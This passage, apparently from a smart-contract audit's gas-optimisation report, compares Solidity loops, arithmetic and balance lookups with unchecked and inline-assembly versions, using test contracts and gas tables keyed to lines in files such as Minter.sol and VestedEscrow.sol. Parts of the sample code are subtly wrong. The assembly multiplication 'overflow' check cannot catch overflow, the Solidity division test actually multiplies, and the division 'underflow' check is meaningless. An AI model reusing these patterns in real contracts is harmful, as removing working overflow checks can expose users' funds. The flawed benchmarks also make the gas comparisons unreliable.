╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 31281              ┆ 186             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyHash       ┆ 231             ┆ 231 ┆ 231    ┆ 231 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines  - InflationManager.sol:628  - InflationManager.sol:632  - InflationManager.sol:636  ---  ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, "loop overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37687              ┆ 219             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ iPlusPlus          ┆ 2039            ┆ 2039 ┆ 2039   ┆ 2039 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ plusPlusI          ┆ 1989            ┆ 1989 ┆ 1989   ┆ 1989 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract3 contract     ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 42693                  ┆ 244             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ safeUncheckedPlusPlusI ┆ 1355            ┆ 1355 ┆ 1355   ┆ 1355 ┆ 1       │ ╰────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 35887              ┆ 210             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ uncheckedPlusPlusI ┆ 1329            ┆ 1329 ┆ 1329   ┆ 1329 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ inlineAssemblyLoop ┆ 709             ┆ 709 ┆ 709    ┆ 709 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - KeeperGauge.sol:59  - KeeperGauge.sol:98  ---  ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40493              ┆ 233             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addTest            ┆ 303             ┆ 303 ┆ 303    ┆ 303 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40293              ┆ 232             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subTest            ┆ 300             ┆ 300 ┆ 300    ┆ 300 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract5 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract6 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract7 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - AmmGauge.sol:111  - AmmGauge.sol:133  - AmmGauge.sol:148  - BkdLocker.sol:140  - BkdLocker.sol:326  - CvxMintAmount.sol:10  - CvxMintAmount.sol:12  - CvxMintAmount.sol:21  - CvxMintAmount.sol:30  - CvxMintAmount.sol:33  - InflationManager.sol:574  - InflationManager.sol:588  - InflationManager.sol:601  - KeeperGauge.sol:114  - LpGauge.sol:115  - Minter.sol:188  - Minter.sol:190  - Minter.sol:200  - Minter.sol:204  - Minter.sol:207  - Minter.sol:219  - Minter.sol:86  - Minter.sol:87  - Minter.sol:88  - Minter.sol:90  - VestedEscrow.sol:104  - VestedEscrow.sol:108  - VestedEscrow.sol:109  - VestedEscrow.sol:155  - VestedEscrow.sol:63  - VestedEscrowRevocable.sol:59  ---  ## Use assembly when getting a contract's balance of ETH.  You can use `selfbalance()` instead of `address(this).balance` when getting your contract's balance of ETH to save gas. Additionally, you can use `balance(address)` instead of `address.balance()` when getting an external contract's balance of ETH.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public {         c0.addressInternalBalance();         c1.assemblyInternalBalance();         c2.addressExternalBalance(address(this));         c3.assemblyExternalBalance(address(this));     } }  contract Contract0 {     function addressInternalBalance() public returns (uint256) {         return address(this).balance;     } }  contract Contract1 {     function assemblyInternalBalance() public returns (uint256) {         assembly {             let c := selfbalance()             mstore(0x00, c)             return(0x00, 0x20)         }     } }  contract Contract2 {     function addressExternalBalance(address addr) public {         uint256 bal = address(addr).balance;         bal++;     } }  contract Contract3 {     function assemblyExternalBalance(address addr) public {         uint256 bal;         assembly {             bal := balance(addr)         }         bal++;     } } ```  ### Gas Report  ```js ╭────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract     ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 23675                  ┆ 147             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addressInternalBalance ┆ 148             ┆ 148 ┆ 148    ┆ 148 ┆ 1       │ ╰────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭─────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract      ┆                 ┆     ┆        ┆     ┆         │ ╞═════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost         ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 27081                   ┆ 165             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name           ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyInternalBalance ┆ 133             ┆ 133 ┆ 133    ┆ 133 ┆ 1       │ ╰─────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract     ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆     ┆        ┆     ┆         │ 